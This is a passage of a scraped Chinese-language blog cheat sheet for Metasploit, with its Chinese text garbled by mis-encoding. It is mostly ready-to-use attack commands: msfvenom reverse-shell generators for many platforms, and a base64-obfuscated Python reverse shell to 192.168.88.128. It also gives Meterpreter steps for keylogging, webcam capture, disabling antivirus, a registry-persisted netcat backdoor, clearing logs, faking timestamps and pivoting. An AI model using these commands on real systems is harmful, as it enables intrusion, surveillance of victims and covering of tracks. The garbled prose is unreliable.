msfconsole</span><br><span class="line"># åˆå§‹åŒ–æ•°æ®åº“</span><br><span class="line">$ msfdb init</span><br><span class="line"># é‡å»ºç¼“å­˜</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># æŸ¥çœ‹æ•°æ®åº“è¿æ¥æƒ…å†µ</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure><h2 id="2-msfåŸºæœ¬å‘½ä»¤-5"><a href="#2-msfåŸºæœ¬å‘½ä»¤-5" class="headerlink" title="2. msfåŸºæœ¬å‘½ä»¤"></a>2. msfåŸºæœ¬å‘½ä»¤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits â€“ æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„æ¸—é€æ”»å‡»ç¨‹åºä»£ç  </span><br><span class="line">show auxiliary â€“ æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„è¾…åŠ©æ”»å‡»å·¥å…· </span><br><span class="line">show options â€“ æŸ¥çœ‹è¯¥æ¨¡å—æ‰€æœ‰å¯ç”¨é€‰é¡¹ </span><br><span class="line">show payloads â€“ æŸ¥çœ‹è¯¥æ¨¡å—é€‚ç”¨çš„æ‰€æœ‰è½½è·ä»£ç  </span><br><span class="line">show targets â€“ æŸ¥çœ‹è¯¥æ¨¡å—é€‚ç”¨çš„æ”»å‡»ç›®æ ‡ç±»å‹</span><br><span class="line">search â€“ æ ¹æ®å…³é”®å­—æœç´¢æŸæ¨¡å— </span><br><span class="line">info â€“ æ˜¾ç¤ºæŸæ¨¡å—çš„è¯¦ç»†ä¿¡æ¯ </span><br><span class="line">use â€“ è¿›å…¥ä½¿ç”¨æŸæ¸—é€æ”»å‡»æ¨¡å— </span><br><span class="line">back â€“ å›é€€ </span><br><span class="line">set/unset â€“ è®¾ç½®/ç¦ç”¨æ¨¡å—ä¸­çš„æŸä¸ªå‚æ•° </span><br><span class="line">setg/unsetg â€“ è®¾ç½®/ç¦ç”¨é€‚ç”¨äºæ‰€æœ‰æ¨¡å—çš„å…¨å±€å‚æ•° </span><br><span class="line">save â€“ å°†å½“å‰è®¾ç½®å€¼ä¿å­˜ä¸‹æ¥ï¼Œä»¥ä¾¿ä¸‹æ¬¡å¯åŠ¨MSFç»ˆç«¯æ—¶ä»å¯ä½¿ç”¨</span><br></pre></td></tr></table></figure><h2 id="3-msfvenomç”Ÿæˆpayload-5"><a href="#3-msfvenomç”Ÿæˆpayload-5" class="headerlink" title="3 msfvenomç”Ÿæˆpayload"></a>3 msfvenomç”Ÿæˆpayload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       æŒ‡å®šéœ€è¦ä½¿ç”¨çš„payload(æ”»å‡»è·è½½)</span><br><span class="line">-l, --list       [module_type]   åˆ—å‡ºæŒ‡å®šæ¨¡å—çš„æ‰€æœ‰å¯ç”¨èµ„æº,æ¨¡å—ç±»å‹åŒ…æ‹¬: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        ä¸ºpayloadé¢„å…ˆæŒ‡å®šä¸€ä¸ªNOPæ»‘åŠ¨é•¿åº¦</span><br><span class="line">-f, --format     &lt;format&gt;        æŒ‡å®šè¾“å‡ºæ ¼å¼ (ä½¿ç”¨ --help-formats æ¥è·å–msfæ”¯æŒçš„è¾“å‡ºæ ¼å¼åˆ—è¡¨)</span><br><span class="line">-e, --encoder    [encoder]       æŒ‡å®šéœ€è¦ä½¿ç”¨çš„encoderï¼ˆç¼–ç å™¨ï¼‰</span><br><span class="line">-a, --arch       &lt;architecture&gt;  æŒ‡å®špayloadçš„ç›®æ ‡æ¶æ„</span><br><span class="line">    --platform   &lt;platform&gt;      æŒ‡å®špayloadçš„ç›®æ ‡å¹³å°</span><br><span class="line">-s, --space      &lt;length&gt;        è®¾å®šæœ‰æ•ˆæ”»å‡»è·è½½çš„æœ€å¤§é•¿åº¦</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          è®¾å®šè§„é¿å­—ç¬¦é›†ï¼Œæ¯”å¦‚: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         æŒ‡å®špayloadçš„ç¼–ç æ¬¡æ•°</span><br><span class="line">-c, --add-code   &lt;path&gt;          æŒ‡å®šä¸€ä¸ªé™„åŠ çš„win32 shellcodeæ–‡ä»¶</span><br><span class="line">-x, --template   &lt;path&gt;          æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰çš„å¯æ‰§è¡Œæ–‡ä»¶ä½œä¸ºæ¨¡æ¿</span><br><span class="line">-k, --keep                       ä¿æŠ¤æ¨¡æ¿ç¨‹åºçš„åŠ¨ä½œï¼Œæ³¨å…¥çš„payloadä½œä¸ºä¸€ä¸ªæ–°çš„è¿›ç¨‹è¿è¡Œ</span><br><span class="line">    --payload-options            åˆ—ä¸¾payloadçš„æ ‡å‡†é€‰é¡¹</span><br><span class="line">-o, --out   &lt;path&gt;               ä¿å­˜payload</span><br><span class="line">-v, --var-name &lt;name&gt;            æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰çš„å˜é‡ï¼Œä»¥ç¡®å®šè¾“å‡ºæ ¼å¼</span><br><span class="line">    --shellest                   æœ€å°åŒ–ç”Ÿæˆpayload</span><br><span class="line">-h, --help                       æŸ¥çœ‹å¸®åŠ©é€‰é¡¹</span><br><span class="line">    --help-formats               æŸ¥çœ‹msfæ”¯æŒçš„è¾“å‡ºæ ¼å¼åˆ—è¡¨</span><br></pre></td></tr></table></figure>1.å¯æ‰§è¡Œç¨‹åºLinux<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">åå‘è¿æ¥ï¼š</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">æ­£å‘è¿æ¥ï¼š</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>Windows<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>Mac<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>æ‰§è¡Œæ–¹å¼ï¼šç›´æ¥å¤åˆ¶å¯æ‰§è¡Œç¨‹åºåˆ°ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œå°±è¡Œäº†ã€‚2.Web PayloadsPHP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>ASP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>JSP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>WAR<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>æ‰§è¡Œæ–¹å¼ï¼šå°†shell.phpæ”¾åœ¨webç›®å½•ä¸‹ï¼Œä½¿ç”¨æµè§ˆå™¨è®¿é—®ï¼Œæˆ–è€…ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ‰§è¡Œï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>3.è„šæœ¬shellPython<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>Bash<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>Perl<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>æ‰§è¡Œæ–¹å¼ï¼šå¤åˆ¶shell.pyä¸­çš„å†…å®¹åœ¨linuxå‘½ä»¤è¡Œä¸‹æ‰§è¡Œï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>4.shellcode<br>Linux Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>Windows Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>Mac Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><h2 id="4-MeterpreteråŸºæœ¬å‘½ä»¤-5"><a href="#4-MeterpreteråŸºæœ¬å‘½ä»¤-5" class="headerlink" title="4. MeterpreteråŸºæœ¬å‘½ä»¤"></a>4. MeterpreteråŸºæœ¬å‘½ä»¤</h2>é¦–å…ˆéœ€è¦å…ˆè·å–meterpreterï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(è®¡åˆ’ä»»åŠ¡ä¸‹è¿›è¡Œæ”»å‡»ï¼Œåå°) -z(æ”»å‡»å®Œæˆä¸é‡ä¼šè¯äº¤äº’)</span><br><span class="line">jobs  # æŸ¥çœ‹åå°æ”»å‡»ä»»åŠ¡ </span><br><span class="line">kill &lt;id&gt;  # åœæ­¢æŸåå°æ”»å‡»ä»»åŠ¡ </span><br><span class="line">sessions -l  # (æŸ¥çœ‹ä¼šè¯)</span><br><span class="line">sessions -i 2   # é€‰æ‹©ä¼šè¯</span><br><span class="line">sessions -k 2   # ç»“æŸä¼šè¯</span><br></pre></td></tr></table></figure>å¦‚æœå…ˆè·å–äº†cmdï¼Œæ¯”å¦‚åˆ©ç”¨ms17-010ï¼Œé»˜è®¤ä½¿ç”¨çš„payloadè¿”å›çš„å°±æ˜¯cmdã€‚è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>sessions-u 2</code>æ¥å°†cmdshellå‡çº§æˆmeterpreterã€‚è·å–åˆ°äº†meterpreterï¼Œå°±å¯ä»¥è¿›è¡Œåæ¸—é€äº†ã€‚<h3 id="4-1-åŸºæœ¬ç³»ç»Ÿå‘½ä»¤-5"><a href="#4-1-åŸºæœ¬ç³»ç»Ÿå‘½ä»¤-5" class="headerlink" title="4.1 åŸºæœ¬ç³»ç»Ÿå‘½ä»¤"></a>4.1 åŸºæœ¬ç³»ç»Ÿå‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># ä¼šè¯ç®¡ç†</span><br><span class="line">background  #å°†å½“å‰ä¼šè¯æ”¾ç½®åå°</span><br><span class="line">sessions  # æŸ¥çœ‹ä¼šè¯</span><br><span class="line">sessions -i  # åˆ‡æ¢ä¼šè¯</span><br><span class="line">quit  # å…³é—­å½“å‰çš„ä¼šè¯ï¼Œè¿”å›msfç»ˆç«¯</span><br><span class="line"></span><br><span class="line"># ç³»ç»Ÿè®¾ç½®</span><br><span class="line">sysinfo  # æŸ¥çœ‹ç›®æ ‡æœºç³»ç»Ÿä¿¡æ¯</span><br><span class="line">idletime  # æŸ¥çœ‹ç›®æ ‡æœºé—²ç½®æ—¶é—´</span><br><span class="line">reboot/shutdown   # é‡å¯/å…³æœº</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # è·å¾—æ§åˆ¶å°æƒé™</span><br><span class="line">irb  # è¿›å…¥rubyç»ˆç«¯</span><br><span class="line"></span><br><span class="line"># è¿›ç¨‹è¿ç§»</span><br><span class="line">getpid    # è·å–å½“å‰è¿›ç¨‹çš„pid</span><br><span class="line">ps   # æŸ¥çœ‹å½“å‰æ´»è·ƒè¿›ç¨‹</span><br><span class="line">migrate &lt;pidå€¼&gt;    #å°†Meterpreterä¼šè¯ç§»æ¤åˆ°æŒ‡å®špidå€¼è¿›ç¨‹ä¸­</span><br><span class="line">kill &lt;pidå€¼&gt;   #æ€æ­»è¿›ç¨‹</span><br><span class="line">migrate &lt;pidå€¼&gt;    #å°†Meterpreterä¼šè¯ç§»æ¤åˆ°æŒ‡å®špidå€¼è¿›ç¨‹ä¸­</span><br><span class="line"></span><br><span class="line"># æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">execute #åœ¨ç›®æ ‡æœºä¸­æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">execute -H -i -f cmd.exe # åˆ›å»ºæ–°è¿›ç¨‹cmd.exeï¼Œ-Hä¸å¯è§ï¼Œ-iäº¤äº’</span><br><span class="line"></span><br><span class="line"># æ‘„åƒå¤´å‘½ä»¤</span><br><span class="line">webcam_list  #æŸ¥çœ‹æ‘„åƒå¤´åˆ—è¡¨</span><br><span class="line">webcam_chat  # æŸ¥çœ‹æ‘„åƒå¤´æ¥å£</span><br><span class="line">webcam_snap   #é€šè¿‡æ‘„åƒå¤´æ‹ç…§</span><br><span class="line">webcam_stream   #é€šè¿‡æ‘„åƒå¤´å¼€å¯è§†é¢‘</span><br><span class="line"></span><br><span class="line"># uictlå¼€å…³é”®ç›˜/é¼ æ ‡</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #å¼€å¯æˆ–ç¦æ­¢é”®ç›˜/é¼ æ ‡</span><br><span class="line">uictl disable mouse  #ç¦ç”¨é¼ æ ‡</span><br><span class="line">uictl disable keyboard  #ç¦ç”¨é”®ç›˜</span><br><span class="line"></span><br><span class="line"># è¿œç¨‹æ¡Œé¢/æˆªå±</span><br><span class="line">enumdesktops  #æŸ¥çœ‹å¯ç”¨çš„æ¡Œé¢</span><br><span class="line">getdesktop    #è·å–å½“å‰meterpreter å…³è”çš„æ¡Œé¢</span><br><span class="line">screenshot  #æˆªå±</span><br><span class="line">use espia  #æˆ–è€…ä½¿ç”¨espiaæ¨¡å—æˆªå±  ç„¶åè¾“å…¥screengrab</span><br><span class="line">run vnc  #ä½¿ç”¨vncè¿œç¨‹æ¡Œé¢è¿æ¥</span><br><span class="line"></span><br><span class="line"># é”®ç›˜è®°å½•</span><br><span class="line">keyscan_start  #å¼€å§‹é”®ç›˜è®°å½•</span><br><span class="line">keyscan_dump   #å¯¼å‡ºè®°å½•æ•°æ®</span><br><span class="line">keyscan_stop #ç»“æŸé”®ç›˜è®°å½•</span><br><span class="line"></span><br><span class="line"># æ·»åŠ ç”¨æˆ·ï¼Œå¼€å¯è¿œç¨‹æ¡Œé¢</span><br><span class="line"># å¼€å¯rdpæ˜¯é€šè¿‡regä¿®æ”¹æ³¨å†Œè¡¨ï¼›æ·»åŠ ç”¨æˆ·æ˜¯è°ƒç”¨cmd.exe é€šè¿‡net useræ·»åŠ ï¼›ç«¯å£è½¬å‘æ˜¯åˆ©ç”¨çš„portfwdå‘½ä»¤</span><br><span class="line">run post/windows/manage/enable_rdp  #å¼€å¯è¿œç¨‹æ¡Œé¢</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #æ·»åŠ ç”¨æˆ·</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #å°†3389ç«¯å£è½¬å‘åˆ°6662</span><br><span class="line"></span><br><span class="line"># å…³é—­é˜²ç—…æ¯’è½¯ä»¶</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># ä¿®æ”¹æ³¨å†Œè¡¨</span><br><span class="line">reg â€“h # æ³¨å†Œè¡¨å‘½ä»¤å¸®åŠ©</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #ä¸Šä¼ nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #æšä¸¾runä¸‹çš„key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #è®¾ç½®é”®å€¼</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #æŸ¥çœ‹é”®å€¼</span><br><span class="line">nc -v 192.168.81.162 443  #æ”»å‡»è€…è¿æ¥ncåé—¨</span><br><span class="line"></span><br><span class="line"># æ¸…ç†æ—¥å¿—</span><br><span class="line">clearav  #æ¸…é™¤windowsä¸­çš„åº”ç”¨ç¨‹åºæ—¥å¿—ã€ç³»ç»Ÿæ—¥å¿—ã€å®‰å…¨æ—¥å¿—</span><br></pre></td></tr></table></figure><h3 id="4-2-æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤-5"><a href="#4-2-æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤-5" class="headerlink" title="4.2 æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤"></a>4.2 æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # åŸºæœ¬å‘½ä»¤</span><br><span class="line">search -f *pass* -d C:\\windows # æœç´¢æ–‡ä»¶  -hæŸ¥çœ‹å¸®åŠ©</span><br><span class="line">getwd/pwd  # è·å–å½“å‰ç›®å½•</span><br><span class="line">getlwd/lpwd   # æ“ä½œæ”»å‡»è€…ä¸»æœº æŸ¥çœ‹å½“å‰ç›®å½•</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # ä¸Šä¼ æ–‡ä»¶</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # ä¸‹è½½æ–‡ä»¶</span><br><span class="line">edit c:\\1.txt  # ç¼–è¾‘æˆ–åˆ›å»ºæ–‡ä»¶  æ²¡æœ‰çš„è¯ï¼Œä¼šæ–°å»ºæ–‡ä»¶</span><br><span class="line">mkdir lltest2  # åªèƒ½åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶å¤¹</span><br><span class="line">rmdir lltest2  # åªèƒ½åˆ é™¤å½“å‰ç›®å½•ä¸‹æ–‡ä»¶å¤¹</span><br><span class="line">lcd /tmp   # æ“ä½œæ”»å‡»è€…ä¸»æœº åˆ‡æ¢ç›®å½•</span><br><span class="line"></span><br><span class="line"># timestompä¼ªé€ æ–‡ä»¶æ—¶é—´æˆ³</span><br><span class="line">timestomp C:// -h   #æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">timestomp -v C://2.txt   #æŸ¥çœ‹æ—¶é—´æˆ³</span><br><span class="line">timestomp C://2.txt -f C://1.txt #å°†1.txtçš„æ—¶é—´æˆ³å¤åˆ¶ç»™2.txt</span><br></pre></td></tr></table></figure><h3 id="4-3-ç½‘ç»œå‘½ä»¤-5"><a href="#4-3-ç½‘ç»œå‘½ä»¤-5" class="headerlink" title="4.3 ç½‘ç»œå‘½ä»¤"></a>4.3 ç½‘ç»œå‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># åŸºæœ¬</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat â€“ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #æŸ¥çœ‹ä»£ç†ä¿¡æ¯</span><br><span class="line">route   #æŸ¥çœ‹è·¯ç”±</span><br><span class="line"></span><br><span class="line"># portfwdç«¯å£è½¬å‘</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # å°†ç›®æ ‡æœºçš„3389ç«¯å£è½¬å‘åˆ°æœ¬åœ°6666ç«¯å£</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #ç„¶åä½¿ç”¨rdesktopæ¥è¿æ¥ï¼Œ-u ç”¨æˆ·å -p å¯†ç </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># æ·»åŠ è·¯ç”±</span><br><span class="line"></span><br><span class="line"># æ–¹å¼ä¸€autoroute ï¼ˆdeprecatedï¼‰</span><br><span class="line">run autoroute â€“h #æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">run autoroute -s 192.168.2.0/24  #æ·»åŠ åˆ°ç›®æ ‡ç¯å¢ƒç½‘ç»œ</span><br><span class="line">run autoroute â€“p  #æŸ¥çœ‹æ·»åŠ çš„è·¯ç”±</span><br><span class="line"># æ–¹å¼äºŒpost/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #è‡ªåŠ¨æ·»åŠ åˆ°ç›®æ ‡ç¯å¢ƒç½‘ç»œ</span><br><span class="line">run post/multi/manage/autoroute CMD=print # æŸ¥çœ‹æ·»åŠ çš„è·¯ç”±</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># ç„¶åå¯ä»¥åˆ©ç”¨arp_scannerã€portscanç­‰è¿›è¡Œæ‰«æ</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autorouteæ·»åŠ å®Œè·¯ç”±åï¼Œè¿˜å¯ä»¥åˆ©ç”¨msfè‡ªå¸¦çš„æ¨¡å—è¿›è¡Œsocksä»£ç†</span><br><span class="line"># msfæä¾›äº†2ä¸ªæ¨¡å—ç”¨æ¥åšsocksä»£ç†ã€‚</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># å…ˆbackgroundé€€å‡ºæ¥ï¼Œç„¶åï¼š</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># ç„¶åvi /etc/proxychains.conf #æ·»åŠ  socks5 127.0.0.1 1080</span><br><span class="line"># æœ€åproxychains ä½¿ç”¨Socks5ä»£ç†è®¿é—®</span><br><span class="line"></span><br><span class="line"># snifferæŠ“åŒ…</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #æŸ¥çœ‹ç½‘å¡</span><br><span 